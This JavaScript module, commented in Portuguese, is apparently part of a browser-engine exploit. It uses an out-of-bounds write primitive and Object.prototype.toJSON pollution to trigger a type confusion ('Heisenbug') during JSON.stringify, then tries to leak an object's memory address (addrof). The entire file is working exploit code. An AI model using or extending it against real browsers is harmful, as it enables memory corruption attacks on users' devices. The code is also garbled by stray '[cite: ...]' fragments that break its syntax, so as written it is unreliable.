// js/script3/testArrayBufferVictimCrash.mjs (Integrando Addrof na Heisenbug Estável)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs'; [cite: 465]
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
    // isOOBReady não é usado diretamente neste script, mas triggerOOB_primitive pode usá-lo internamente
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// Nome do módulo atualizado para refletir a nova tentativa
export const FNAME_MODULE_V28 = "ArrayBufferVictim_StableHeisenbug_Addrof_v1";

const CRITICAL_OOB_WRITE_VALUE  = 0xFFFFFFFF; [cite: 466]
const VICTIM_AB_SIZE = 64; [cite: 466]

// Variáveis globais para a sonda toJSON e resultados do addrof
let toJSON_call_details_v28 = null;
let victim_ab_ref_for_original_test = null; // Para a sonda verificar se 'this' é o objeto certo
let object_to_leak_for_addrof_attempt = null; // Objeto cujo endereço queremos vazar
let write_attempted_in_probe = false; // Flag para indicar se a escrita do addrof foi tentada

// Sonda toJSON_V28_MinimalProbe, agora com tentativa de escrita para addrof
function toJSON_V28_Probe_For_Addrof() {
    // Inicializa/reseta os detalhes para esta chamada da sonda.
    // A variável global toJSON_call_details_v28 será atualizada se 'this' for o nosso victim_ab.
    let local_details = {
        probe_variant: "V28_Probe_For_Addrof_v1",
        this_type_in_toJSON: "N/A_before_call",
        error_in_toJSON: null,
        probe_called: true
    };

    try {
        local_details.this_type_in_toJSON = Object.prototype.toString.call(this);

        if (this === victim_ab_ref_for_original_test) {
            // Atualiza a variável global apenas se 'this' for o nosso victim_ab
            toJSON_call_details_v28 = local_details;
            logS3(`[toJSON_Probe_For_Addrof] 'this' é victim_ab. Tipo de 'this': ${local_details.this_type_in_toJSON}`, "leak");

            if (local_details.this_type_in_toJSON === '[object Object]') {
                logS3(`[toJSON_Probe_For_Addrof] HEISENBUG CONFIRMADA PARA VICTIM_AB! Tentando escrever object_to_leak em this[0]...`, "vuln");
                if (object_to_leak_for_addrof_attempt) {
                    this[0] = object_to_leak_for_addrof_attempt; // A escrita crucial!
                    write_attempted_in_probe = true; // Marca que a escrita foi tentada
                    logS3(`[toJSON_Probe_For_Addrof] Escrita de referência em this[0] (supostamente) realizada.`, "info");
                } else {
                    logS3(`[toJSON_Probe_For_Addrof] object_to_leak_for_addrof_attempt é null. Escrita não tentada.`, "warn");
                }
            } else {
                logS3(`[toJSON_Probe_For_Addrof] Heisenbug NÃO confirmada para victim_ab. Tipo de 'this': ${local_details.this_type_in_toJSON}`, "warn");
            }
        }
    } catch (e) {
        local_details.error_in_toJSON = `${e.name}: ${e.message}`;
        if (this === victim_ab_ref_for_original_test) { // Se o erro foi no nosso victim_ab, atualiza global
            toJSON_call_details_v28 = local_details;
        }
        logS3(`[toJSON_Probe_For_Addrof] ERRO na sonda: ${e.name} - ${e.message}`, "error");
    }
    return { minimal_probe_executed: true, type_observed_by_this_call: local_details.this_type_in_toJSON };
}


export async function executeArrayBufferVictimCrashTest() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.triggerAndAddrof`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Addrof sobre Heisenbug Estável ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_V28} Inic...`;

    // Resetar variáveis globais do teste
    toJSON_call_details_v28 = null;
    victim_ab_ref_for_original_test = null;
    object_to_leak_for_addrof_attempt = { marker: Date.now(), id: "MyTargetObjectForStableAddrof" };
    write_attempted_in_probe = false;

    let errorCapturedMain = null;
    let stringifyOutput = null;
    let addrof_result = {
        success: false,
        leaked_address_as_double: null,
        leaked_address_as_int64: null,
        message: "Addrof não tentado ou Heisenbug não ocorreu na sonda para o victim_ab."
    };
    
    // Usar o offset 0x7C, que funcionou consistentemente nos logs para a Heisenbug
    const corruptionTargetOffsetInOOBAB = 0x7C; [cite: 463, 517]
    const fillPattern = 0.123456789101112; // Padrão de preenchimento do log original

    try {
        await triggerOOB_primitive({ force_reinit: true });
        if (!oob_array_buffer_real) { throw new Error("OOB Init falhou."); } [cite: 468]
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST); [cite: 517]
        logS3(`   Alvo da corrupção OOB em oob_array_buffer_real: ${toHex(corruptionTargetOffsetInOOBAB)}`, "info", FNAME_CURRENT_TEST); [cite: 517]

        logS3(`PASSO 1: Escrevendo valor CRÍTICO ${toHex(CRITICAL_OOB_WRITE_VALUE)} em oob_array_buffer_real[${toHex(corruptionTargetOffsetInOOBAB)}]...`, "warn", FNAME_CURRENT_TEST); [cite: 517]
        oob_write_absolute(corruptionTargetOffsetInOOBAB, CRITICAL_OOB_WRITE_VALUE, 4); [cite: 468]
        logS3(`  Escrita OOB crítica em ${toHex(corruptionTargetOffsetInOOBAB)} realizada.`, "info", FNAME_CURRENT_TEST); [cite: 517]
        
        await PAUSE_S3(100); [cite: 468]

        victim_ab_ref_for_original_test = new ArrayBuffer(VICTIM_AB_SIZE); [cite: 468]
        let float64_view_on_victim = new Float64Array(victim_ab_ref_for_original_test);
        float64_view_on_victim.fill(fillPattern); 

        logS3(`PASSO 2: victim_ab (tamanho ${VICTIM_AB_SIZE} bytes) criado. View preenchida com ${float64_view_on_victim[0]}. Tentando JSON.stringify com ${toJSON_V28_Probe_For_Addrof.name}...`, "test", FNAME_CURRENT_TEST); [cite: 518]
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey); [cite: 469]
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, {
                value: toJSON_V28_Probe_For_Addrof,
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            logS3(`  Object.prototype.${ppKey} poluído com ${toJSON_V28_Probe_For_Addrof.name}.`, "info", FNAME_CURRENT_TEST); [cite: 518]

            logS3(`  Chamando JSON.stringify(victim_ab_ref_for_original_test)... (Ponto esperado da Heisenbug e escrita para addrof)`, "warn", FNAME_CURRENT_TEST); [cite: 518]
            stringifyOutput = JSON.stringify(victim_ab_ref_for_original_test); 
            
            logS3(`  JSON.stringify(victim_ab_ref_for_original_test) completou. Resultado (da sonda): ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST); [cite: 518]
            // toJSON_call_details_v28 agora é preenchido pela sonda se this === victim_ab_ref_for_original_test
            logS3(`  Detalhes da sonda (toJSON_call_details_v28): ${toJSON_call_details_v28 ? JSON.stringify(toJSON_call_details_v28) : 'N/A (sonda não chamada para victim_ab?)'}`, "leak", FNAME_CURRENT_TEST); [cite: 594]
            logS3(`  Flag de tentativa de escrita pela sonda (write_attempted_in_probe): ${write_attempted_in_probe}`, write_attempted_in_probe ? "good" : "warn", FNAME_CURRENT_TEST);

            // A verificação principal: Heisenbug ocorreu E a escrita foi tentada pela sonda
            if (toJSON_call_details_v28 && toJSON_call_details_v28.this_type_in_toJSON === "[object Object]" && write_attempted_in_probe) {
                logS3(`  HEISENBUG CONFIRMADA E ESCRITA TENTADA PELA SONDA! Verificando buffer...`, "vuln", FNAME_CURRENT_TEST); [cite: 581]
                
                logS3("PASSO 3: Verificando float64_view_on_victim[0] APÓS Heisenbug e tentativa de escrita na sonda...", "warn", FNAME_CURRENT_TEST); [cite: 519]
                const value_read_as_double = float64_view_on_victim[0]; [cite: 519]
                addrof_result.leaked_address_as_double = value_read_as_double;
                logS3(`  Valor lido de float64_view_on_victim[0]: ${value_read_as_double}`, "leak", FNAME_CURRENT_TEST); [cite: 519]

                const double_buffer_for_conversion = new ArrayBuffer(8); [cite: 582]
                (new Float64Array(double_buffer_for_conversion))[0] = value_read_as_double;
                const int32_view_for_double_conversion = new Uint32Array(double_buffer_for_conversion);
                addrof_result.leaked_address_as_int64 = new AdvancedInt64(int32_view_for_double_conversion[0], int32_view_for_double_conversion[1]);
                logS3(`  Interpretado como Int64: ${addrof_result.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST); [cite: 519]

                if (value_read_as_double !== 0 && value_read_as_double !== fillPattern &&
                    (addrof_result.leaked_address_as_int64.high() < 0x00020000 || (addrof_result.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) { [cite: 583]
                    logS3("  !!!! VALOR LIDO PARECE UM PONTEIRO POTENCIAL (addrof) !!!!", "vuln", FNAME_CURRENT_TEST); [cite: 583]
                    addrof_result.success = true;
                    addrof_result.message = "Heisenbug confirmada, escrita tentada pela sonda, E leitura de double sugere um ponteiro.";
                    document.title = `${FNAME_MODULE_V28}: Addr? ${addrof_result.leaked_address_as_int64.toString(true)}`;
                } else {
                    addrof_result.message = "Heisenbug confirmada e escrita tentada, mas valor lido não parece ponteiro ou buffer não foi alterado."; [cite: 584]
                    logS3(`  INFO: ${addrof_result.message} (Valor lido: ${value_read_as_double})`, "warn", FNAME_CURRENT_TEST); [cite: 584]
                    document.title = `${FNAME_MODULE_V28}: Heisenbug OK, Addr Falhou`; [cite: 584]
                }
            } else {
                let msg = "Condições para addrof não totalmente atendidas.";
                if (!toJSON_call_details_v28 || toJSON_call_details_v28.this_type_in_toJSON !== "[object Object]") {
                    msg += ` Heisenbug (this como [object Object]) não foi confirmada via toJSON_call_details_v28. Tipo obs: ${toJSON_call_details_v28 ? toJSON_call_details_v28.this_type_in_toJSON : "N/A"}.`;
                } else if (!write_attempted_in_probe) {
                    msg += " Heisenbug confirmada, mas escrita não foi (ou não foi marcada como) tentada pela sonda.";
                }
                addrof_result.message = msg;
                logS3(`  ALERTA: ${addrof_result.message}`, "error", FNAME_CURRENT_TEST);
                document.title = `${FNAME_MODULE_V28}: Addrof PreCond Falhou`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            logS3(`   ERRO CRÍTICO durante JSON.stringify ou lógica de addrof: ${e_str.name} - ${e_str.message}`, "critical", FNAME_CURRENT_TEST); [cite: 585]
            document.title = `${FNAME_MODULE_V28}: Stringify/Addrof ERR`; [cite: 585]
            addrof_result.message = `Erro na execução principal: ${e_str.name} - ${e_str.message}`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); [cite: 586]
                else delete Object.prototype[ppKey];
            }
        }

    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`ERRO CRÍTICO GERAL no teste: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST); [cite: 587]
        if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_V28} FALHOU CRITICAMENTE`; [cite: 587]
        addrof_result.message = `Erro geral no teste: ${e_outer_main.name}`;
    } finally {
        clearOOBEnvironment(); [cite: 587]
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST); [cite: 587]
        logS3(`Resultado Addrof: Success=${addrof_result.success}, Msg='${addrof_result.message}'`, addrof_result.success ? "good" : "warn", FNAME_CURRENT_TEST); [cite: 587]
        if(addrof_result.leaked_address_as_int64 && (addrof_result.leaked_address_as_int64.low() !==0 || addrof_result.leaked_address_as_int64.high() !==0)){
            logS3(`  Addrof (Int64): ${addrof_result.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST); [cite: 587]
        }
        object_to_leak_for_addrof_attempt = null;
        victim_ab_ref_for_original_test = null;
        toJSON_call_details_v28 = null; // Limpar para próxima execução, se houver
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed: false, 
        stringifyResult: stringifyOutput, 
        toJSON_details: toJSON_call_details_v28,
        addrof_attempt_result: addrof_result 
    };
}
